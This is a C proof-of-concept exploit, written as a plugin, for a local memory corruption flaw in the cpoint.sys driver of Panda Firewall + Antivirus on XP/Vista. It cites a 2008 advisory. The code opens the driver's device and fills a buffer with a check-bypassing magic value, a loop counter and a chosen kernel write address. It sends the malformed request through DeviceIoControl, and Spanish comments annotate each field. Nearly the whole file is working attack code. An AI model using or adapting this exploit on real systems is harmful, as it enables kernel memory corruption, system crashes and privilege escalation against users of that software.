// Panda Firewall + Antivirus cpoint.sys Local Memory Corruption PoC
// +NCR/CRC! [ReVeRsEr] - CracksLatinoS! 2003-2008
// For research purposes ONLY

#include "stdafx.h"

#define IOCTL 0xba002848
#define MAX_BUFFER_SIZE 0x1008

#define PANDA_PLUGIN __declspec(dllexport)

 PANDA_PLUGIN int Callback_Overview()
{
	printf("\n");
	printf("=================================================	\n");
	printf("	Panda Firewall + Antivirus cpoint.sys PoC\n");
	printf("	cpoint.sys Memory Corruption PoC \n");
	printf("	XP / Vista \n");
	printf("=================================================	\n");
	printf("+ References:\n");
	printf("  http://www.trapkit.de/advisories/TKADV2008-001.txt\n");
	printf("+ Author of plugin:\n");
	printf("  +NCR/CRC! [ReVeRsEr]\n");
	return 1;
}

PANDA_PLUGIN int Callback_Direct(char* lpInitStr)
{
	HANDLE hDevice;
	DWORD bytes_ret;
	int status=0;
	char   in_buffer[MAX_BUFFER_SIZE], out_buffer[MAX_BUFFER_SIZE];
	
	Callback_Overview();
	
	
	printf("\n[+] Checking device...");
	hDevice = OpenDevice(L"\\Device\\PandaSoftware\\cPointFlt",
						TRUE,
						FALSE,
						FALSE,
						0,
						0);

	if( hDevice == INVALID_HANDLE_VALUE )
	{ 
		printf("Failed!\n\n");
		return FALSE;
	}
	printf("OK\n");
	
	printf("[+] Sending malformed request...");
	Sleep(2000);

    // f9d2e8be 817d1008100000  cmp     dword ptr [ebp+10h],1008h
    // s f9d24000 f9d28580 81 7d 10 08 10 00 00
    memset(in_buffer,0,sizeof(in_buffer));

    // cargamos el input_buffer para pasar los checks
    // DWORD para el primer chek = 0x3F256B9A
    
    memcpy(in_buffer,"\x9a\x6b\x25\x3f",4);

    // in_buffer+8 es el contador del bucle
    memcpy(in_buffer+8,"\x00\x00\x00\x01",4);

    // in_buffer+0x0c es el address donde queremos escribir
    memcpy(in_buffer+0x0c,"\xdc\x3a\x50\x80",4);
    
    memcpy(in_buffer+0x10c,"\x00\x00\x00\x00",4);
    
    DeviceIoControl(hDevice, IOCTL, in_buffer, sizeof(in_buffer), out_buffer, sizeof(out_buffer), &bytes_ret, NULL);

	printf("OK\n");

	return status;
}